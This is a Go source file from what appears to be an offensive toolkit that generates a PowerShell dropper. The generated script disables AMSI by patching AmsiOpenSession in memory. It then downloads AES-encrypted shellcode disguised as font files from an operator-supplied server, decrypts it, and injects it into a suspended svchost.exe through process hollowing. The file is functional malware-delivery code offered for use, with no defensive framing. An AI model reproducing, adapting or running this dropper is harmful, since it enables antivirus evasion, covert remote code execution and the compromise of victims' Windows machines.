package dropper

import (
	"fmt"
	"os"
	"strings"
	"text/template"
)

type PowerShell struct {
	DropperType string
	FileName    string
	PayloadUrl  string
	OutFile     string
	Result      string
}

func NewPowerShell() *PowerShell {
	return &PowerShell{
		DropperType: DROPPER_TYPE_POWERSHELL,
		OutFile:     "",
	}
}

func (p *PowerShell) GetName() string {
	return p.DropperType
}

func (p *PowerShell) SetFileName(fileName string) {
	p.FileName = fileName
}

func (p *PowerShell) GetPayloadUrl() string {
	return p.PayloadUrl
}

func (p *PowerShell) SetPayloadUrl(payloadUrl string) {
	p.PayloadUrl = payloadUrl
}

func (p *PowerShell) SetOutFile(outFile string) {
	p.OutFile = outFile
}

func (p *PowerShell) GetResult() string {
	return p.Result
}

func (p *PowerShell) Render() error {
	t := template.Must(template.New("powershell").Parse(powershellTemplate))
	data := powershellTemplateData{
		PaychefServerAddr: p.PayloadUrl,
	}

	var sb strings.Builder
	err := t.Execute(&sb, data)
	if err != nil {
		return fmt.Errorf("failed to execute template: %w", err)
	}

	p.Result = sb.String()
	return nil
}

func (p *PowerShell) PrintResult() error {
	err := os.WriteFile(POWERSHELL_LOCATION, []byte(p.Result), 0644)
	if err != nil {
		return fmt.Errorf("failed to write to output file %s: %w", p.OutFile, err)
	}

	fmt.Printf("PowerShell script written to %s\n", POWERSHELL_LOCATION)

	return nil
}

type powershellTemplateData struct {
	PaychefServerAddr string
}

const powershellTemplate = `function LookupFunc {
    Param ($moduleName, $functionName)
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
        Where-Object { $_.GlobalAssemblyCache -and $_.Location.Split('\')[-1] -eq 'System.dll' }
    ).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp = @()
    $assem.GetMethods() | ForEach-Object {
        if ($_.Name -eq 'GetProcAddress') { $tmp += $_ }
    }
    return $tmp[0].Invoke($null, @(( $assem.GetMethod('GetModuleHandle') ).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType {
    Param (
        [Parameter(Position = 0, Mandatory = $true)] [Type[]] $func,
        [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
        [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
        DefineDynamicModule('InMemoryModule', $false).
        DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
        SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
        SetImplementationFlags('Runtime, Managed')
    return $type.CreateType()
}

[IntPtr] $funcAddr = LookupFunc amsi.dll AmsiOpenSession
$oldProtectionBuffer = 0
$vp = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupFunc kernel32.dll VirtualProtect),
    (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool]))
)
$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer) | Out-Null
[Byte[]] $patch = 0x48,0x31,0xC0
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $funcAddr, 3)
$vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer) | Out-Null

$encShellcodeUrl = '{{.PaychefServerAddr}}/good-font.woff'   
$keyUrl          = '{{.PaychefServerAddr}}/good-font.ttf'    
$ivUrl           = '{{.PaychefServerAddr}}/good-font.woff2'  
$processToHollow = 'C:\Windows\System32\svchost.exe'             

$webClient = New-Object System.Net.WebClient
[Byte[]] $encryptedShellcode = $webClient.DownloadData($encShellcodeUrl)
[Byte[]] $aesKey            = $webClient.DownloadData($keyUrl)
[Byte[]] $aesIV             = $webClient.DownloadData($ivUrl)
$webClient.Dispose()

$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key    = $aesKey
$aes.IV     = $aesIV
$aes.Mode   = [System.Security.Cryptography.CipherMode]::CBC
$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$decryptor  = $aes.CreateDecryptor()
[Byte[]] $shellcode = $decryptor.TransformFinalBlock($encryptedShellcode, 0, $encryptedShellcode.Length)
$aes.Dispose()

$siSize = 104  
$piSize = 24   
$siPtr  = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($siSize)
$piPtr  = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($piSize)
[System.Runtime.InteropServices.Marshal]::Copy((New-Object Byte[]($siSize)), 0, $siPtr, $siSize)
[System.Runtime.InteropServices.Marshal]::Copy((New-Object Byte[]($piSize)), 0, $piPtr, $piSize)
[System.Runtime.InteropServices.Marshal]::WriteInt32($siPtr, 0, $siSize)

[IntPtr] $targetExePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($processToHollow)
$cpDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupFunc kernel32.dll CreateProcessA),
    (getDelegateType @(
        [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool],
        [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr]
    ) ([Bool]))
)
$success = $cpDelegate.Invoke(
    [IntPtr]::Zero,   
    $targetExePtr,    
    [IntPtr]::Zero,   
    [IntPtr]::Zero,   
    $false,           
    0x4,              
    [IntPtr]::Zero,   
    [IntPtr]::Zero,   
    $siPtr,           
    $piPtr            
)
if (-not $success) {
    throw "CreateProcessA failed"
}

[IntPtr] $processHandle = [System.Runtime.InteropServices.Marshal]::ReadIntPtr($piPtr, 0)
[IntPtr] $threadHandle  = [System.Runtime.InteropServices.Marshal]::ReadIntPtr($piPtr, [IntPtr]::Size)
[System.Runtime.InteropServices.Marshal]::FreeHGlobal($siPtr)
[System.Runtime.InteropServices.Marshal]::FreeHGlobal($targetExePtr)
[System.Runtime.InteropServices.Marshal]::FreeHGlobal($piPtr)

$zwqDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupFunc ntdll.dll ZwQueryInformationProcess),
    (getDelegateType @([IntPtr], [Int32], [IntPtr], [UInt32], [IntPtr]) ([Int32]))
)
[IntPtr] $pbiPtr   = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(48)  # 48 bytes on x64
[IntPtr] $retLenPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(4)  # 4 bytes for return length
[System.Runtime.InteropServices.Marshal]::WriteInt32($retLenPtr, 0, 0)
$zwqDelegate.Invoke($processHandle, 0, $pbiPtr, 48, $retLenPtr) | Out-Null
[IntPtr] $pebAddress = [System.Runtime.InteropServices.Marshal]::ReadIntPtr($pbiPtr, 8)
[System.Runtime.InteropServices.Marshal]::FreeHGlobal($pbiPtr)
[System.Runtime.InteropServices.Marshal]::FreeHGlobal($retLenPtr)

[IntPtr] $baseAddressPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([IntPtr]::Size)
$rpmDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupFunc kernel32.dll ReadProcessMemory),
    (getDelegateType @([IntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([Bool]))
)
$rpmDelegate.Invoke($processHandle, [IntPtr]($pebAddress.ToInt64() + 0x10), $baseAddressPtr, [IntPtr]::Size, [IntPtr]::Zero) | Out-Null
[IntPtr] $imageBase = [System.Runtime.InteropServices.Marshal]::ReadIntPtr($baseAddressPtr, 0)
[System.Runtime.InteropServices.Marshal]::FreeHGlobal($baseAddressPtr)

[IntPtr] $headerPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(512)
$rpmDelegate.Invoke($processHandle, $imageBase, $headerPtr, 512, [IntPtr]::Zero) | Out-Null
$e_lfanew = [System.Runtime.InteropServices.Marshal]::ReadInt32($headerPtr, 0x3C)
$entryRVA = [System.Runtime.InteropServices.Marshal]::ReadInt32($headerPtr, $e_lfanew + 0x28)
[IntPtr] $entryPoint = [IntPtr]($imageBase.ToInt64() + $entryRVA)
[System.Runtime.InteropServices.Marshal]::FreeHGlobal($headerPtr)

$wpmDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupFunc kernel32.dll WriteProcessMemory),
    (getDelegateType @([IntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([Bool]))
)
$payloadSize = $shellcode.Length
[IntPtr] $localBuffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($payloadSize)
[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $localBuffer, $payloadSize)
$wpmDelegate.Invoke($processHandle, $entryPoint, $localBuffer, $payloadSize, [IntPtr]::Zero) | Out-Null
[System.Runtime.InteropServices.Marshal]::FreeHGlobal($localBuffer)

$resumeDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupFunc kernel32.dll ResumeThread),
    (getDelegateType @([IntPtr]) ([UInt32]))
)
$resumeDelegate.Invoke($threadHandle) | Out-Null

$closeDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupFunc kernel32.dll CloseHandle),
    (getDelegateType @([IntPtr]) ([Bool]))
)
$closeDelegate.Invoke($threadHandle) | Out-Null
$closeDelegate.Invoke($processHandle) | Out-Null

`

const (
	DROPPER_TYPE_POWERSHELL = "PowerShell"
	POWERSHELL_LOCATION        = "assets/dropper-powershell64.ps1"
)
